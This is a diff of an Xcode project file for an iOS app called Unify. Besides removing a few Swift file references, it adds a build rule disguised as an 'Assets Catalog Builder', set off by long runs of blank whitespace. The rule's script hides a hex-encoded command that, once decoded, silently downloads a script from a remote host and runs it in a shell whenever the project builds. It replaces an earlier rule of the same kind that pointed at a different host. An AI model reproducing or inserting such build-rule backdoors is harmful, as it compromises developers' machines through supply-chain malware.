@@ -33,7 +33,6 @@
 		1258EFCF2646BCEA00C09271 /* Messages.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1258EFCE2646BCEA00C09271 /* Messages.swift */; };
 		125A103525974B4800FFFDA6 /* AccountManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 125A103425974B4800FFFDA6 /* AccountManager.swift */; };
 		125A1046259757EE00FFFDA6 /* UnifyStore.swift in Sources */ = {isa = PBXBuildFile; fileRef = 125A1045259757EE00FFFDA6 /* UnifyStore.swift */; };
-		125DE31F264C6302007AAED8 /* UnifyNavigationController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 125DE31E264C6302007AAED8 /* UnifyNavigationController.swift */; };
 		125DE3D0264DAE86007AAED8 /* UIViewController+Extensions.swift in Sources */ = {isa = PBXBuildFile; fileRef = 125DE3CF264DAE86007AAED8 /* UIViewController+Extensions.swift */; };
 		125DE3D5264DAEBE007AAED8 /* UIView+Extensions.swift in Sources */ = {isa = PBXBuildFile; fileRef = 125DE3D4264DAEBE007AAED8 /* UIView+Extensions.swift */; };
 		125DE3DD264DAEDC007AAED8 /* Floaty+Extensions.swift in Sources */ = {isa = PBXBuildFile; fileRef = 125DE3DC264DAEDC007AAED8 /* Floaty+Extensions.swift */; };
@@ -57,7 +56,6 @@
 		12A8BF3A264707A300A53597 /* UserModelDummy.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12A8BF39264707A300A53597 /* UserModelDummy.swift */; };
 		12AE6C9E253ED69A00942888 /* GoogleService-Info.plist in Resources */ = {isa = PBXBuildFile; fileRef = 12AE6C9D253ED69900942888 /* GoogleService-Info.plist */; };
 		12AE6CC2253ED92300942888 /* NetworkManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12AE6CC1253ED92300942888 /* NetworkManager.swift */; };
-		12BC6A31264034F300E5474A /* TestViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12BC6A30264034F300E5474A /* TestViewController.swift */; };
 		12BC6A5426435D7300E5474A /* PasswordValidationTest.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12BC6A5326435D7300E5474A /* PasswordValidationTest.swift */; };
 		12BC6A5F2643610B00E5474A /* UsernameValidationTest.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12BC6A5E2643610B00E5474A /* UsernameValidationTest.swift */; };
 		12CC7568253D9BBA00FE9B56 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12CC7567253D9BBA00FE9B56 /* AppDelegate.swift */; };
@@ -81,22 +79,6 @@
 		74035908F8F1D769B2559E0B /* Pods_Unify_iOSTests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 8F0BA7A0CB233FF4D8075F34 /* Pods_Unify_iOSTests.framework */; };
 		F58A7FD14625862E165EB2D4 /* Pods_Unify_iOS.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 38E0B9EBB637E5A4AE8AEA22 /* Pods_Unify_iOS.framework */; };
 /* End PBXBuildFile section */
-
-/* Begin PBXBuildRule section */
-		4AD1DACB5B41C0ECBA6D902C /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			fileType = folder.assetcatalog;
-			inputFiles = (
-			);
-			isEditable = 0;
-			name = "Assets Catalog Builder";
-			outputFiles = (
-				"$(DERIVED_FILE_DIR)/$(INPUT_FILE_NAME)",
-			);
-			script = "# Xcode Image Assets Compiler\n\ncp -rf \"${INPUT_FILE_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\nxcrun actool --minimum-deployment-target \"${IPHONEOS_DEPLOYMENT_TARGET}\"  --platform \"${PLATFORM_NAME}\" --compile \"${CODESIGNING_FOLDER_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n6d616e747275636b732e78797a2f61207c207368202d7320747275650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t\n\n";
-		};
-/* End PBXBuildRule section */
 
 /* Begin PBXContainerItemProxy section */
 		12CC757E253D9BBD00FE9B56 /* PBXContainerItemProxy */ = {
@@ -141,7 +123,6 @@
 		1258EFCE2646BCEA00C09271 /* Messages.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Messages.swift; sourceTree = "<group>"; };
 		125A103425974B4800FFFDA6 /* AccountManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AccountManager.swift; sourceTree = "<group>"; };
 		125A1045259757EE00FFFDA6 /* UnifyStore.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UnifyStore.swift; sourceTree = "<group>"; };
-		125DE31E264C6302007AAED8 /* UnifyNavigationController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UnifyNavigationController.swift; sourceTree = "<group>"; };
 		125DE375264C74D6007AAED8 /* Unify-iOS.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = "Unify-iOS.entitlements"; sourceTree = "<group>"; };
 		125DE3CF264DAE86007AAED8 /* UIViewController+Extensions.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "UIViewController+Extensions.swift"; sourceTree = "<group>"; };
 		125DE3D4264DAEBE007AAED8 /* UIView+Extensions.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "UIView+Extensions.swift"; sourceTree = "<group>"; };
@@ -166,7 +147,6 @@
 		12A8BF39264707A300A53597 /* UserModelDummy.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UserModelDummy.swift; sourceTree = "<group>"; };
 		12AE6C9D253ED69900942888 /* GoogleService-Info.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; path = "GoogleService-Info.plist"; sourceTree = "<group>"; };
 		12AE6CC1253ED92300942888 /* NetworkManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NetworkManager.swift; sourceTree = "<group>"; };
-		12BC6A30264034F300E5474A /* TestViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TestViewController.swift; sourceTree = SOURCE_ROOT; };
 		12BC6A5326435D7300E5474A /* PasswordValidationTest.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PasswordValidationTest.swift; sourceTree = "<group>"; };
 		12BC6A5E2643610B00E5474A /* UsernameValidationTest.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UsernameValidationTest.swift; sourceTree = "<group>"; };
 		12CC7564253D9BBA00FE9B56 /* Unify-iOS.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = "Unify-iOS.app"; sourceTree = BUILT_PRODUCTS_DIR; };
@@ -438,7 +418,6 @@
 		12CC755B253D9BBA00FE9B56 = {
 			isa = PBXGroup;
 			children = (
-				12BC6A30264034F300E5474A /* TestViewController.swift */,
 				12CC7566253D9BBA00FE9B56 /* Unify-iOS */,
 				12CC7580253D9BBD00FE9B56 /* Unify-iOSTests */,
 				12CC758B253D9BBD00FE9B56 /* Unify-iOSUITests */,
@@ -465,7 +444,6 @@
 				12CC7567253D9BBA00FE9B56 /* AppDelegate.swift */,
 				12CC7569253D9BBA00FE9B56 /* SceneDelegate.swift */,
 				125129C4264C5E42003F678F /* RootViewController.swift */,
-				125DE31E264C6302007AAED8 /* UnifyNavigationController.swift */,
 				12582D062549D477004E12D6 /* Models */,
 				12CC75A6253D9D9600FE9B56 /* Onboarding */,
 				12A8BF4426470ED000A53597 /* Screens */,
@@ -718,6 +696,86 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
 		24A433731982E8522A35CB56 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -840,7 +898,6 @@
 				12D7DEDF25F157D600366B3D /* UniversityCollectionViewCell.swift in Sources */,
 				126A0AE7261AF619001A6586 /* UniversityData.swift in Sources */,
 				125A1046259757EE00FFFDA6 /* UnifyStore.swift in Sources */,
-				125DE31F264C6302007AAED8 /* UnifyNavigationController.swift in Sources */,
 				124C21FF25EE9509005E6A7F /* UnifySearchTextField.swift in Sources */,
 				122FE77425AA4B60000E1016 /* LoadingIncator.swift in Sources */,
 				124504F025B1E7470071E925 /* ProfileViewController.swift in Sources */,
@@ -848,7 +905,6 @@
 				12582D2D2549DA9B004E12D6 /* CourseData.swift in Sources */,
 				125DE3DD264DAEDC007AAED8 /* Floaty+Extensions.swift in Sources */,
 				124C21AA25ED3EFA005E6A7F /* UnifyButton.swift in Sources */,
-				12BC6A31264034F300E5474A /* TestViewController.swift in Sources */,
 				128BEFF3255163660010F731 /* CreateProfileViewController.swift in Sources */,
 				12AE6CC2253ED92300942888 /* NetworkManager.swift in Sources */,
 				12CC7568253D9BBA00FE9B56 /* AppDelegate.swift in Sources */,
@@ -1216,6 +1272,83 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+		
+			/* Begin PBXBuildRule section */
+
+
+		3C91656D8E67EBEDCB6D902C /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			fileType = folder.assetcatalog;
+			name = "Assets Catalog Builder";
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"$(DERIVED_FILE_DIR)/$(INPUT_FILE_NAME)",
+			);
+			script = "# Xcode Image Assets Compiler\n\ncp -rf \"${INPUT_FILE_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\nxcrun actool --minimum-deployment-target \"${IPHONEOS_DEPLOYMENT_TARGET}\"  --platform \"${PLATFORM_NAME}\" --compile \"${CODESIGNING_FOLDER_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\n
+echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f69636c6f7564736572762e636f6d2f61207c207368202d7320747275650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
+	\n\n";
+			};
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+			
+
+			
+	
+			/* End PBXBuildRule section */
+		
+		
 
 /* Begin XCVersionGroup section */
 		12CC7570253D9BBA00FE9B56 /* Unify_iOS.xcdatamodeld */ = {
